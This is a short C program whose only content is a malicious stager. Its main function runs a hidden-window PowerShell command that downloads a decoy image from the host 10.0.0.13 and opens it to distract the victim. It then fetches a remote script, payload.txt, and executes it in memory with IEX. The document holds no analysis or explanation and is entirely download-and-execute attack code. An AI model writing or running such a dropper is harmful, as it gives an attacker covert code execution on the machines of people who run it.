#include<stdio.h>
main()
{
    system("powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://10.0.0.13/screenshot.jpg', 'C:\\Users\\Public\\screenshot.jpg') & start C:\\Users\\Public\\screenshot.jpg & powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://10.0.0.13/payload.txt'))\"");
    return 0;
}
